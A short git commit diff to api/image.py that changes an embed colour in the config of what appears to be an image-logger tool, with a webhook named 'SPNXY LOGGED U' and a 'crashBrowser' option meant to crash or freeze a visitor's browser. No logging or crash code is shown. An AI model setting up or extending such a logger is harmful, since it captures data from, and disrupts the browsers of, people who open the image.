f08861bff4f0ae2b1ef601c87cf7384649406b7e
smooth-runner <69725374+smooth-runner@users.noreply.github.com>
2025-05-22 18:02:11 +0200

    Update image.py

--- api/image.py
+++ api/image.py
@@ -19,7 +19,7 @@ config = {
 
     # CUSTOMIZATION #
     "username": "SPNXY LOGGED U", # Set this to the name you want the webhook to have
-    "color": 4c00b0, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "color": 800080, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/xdexty0/Chromebook-Crasher)
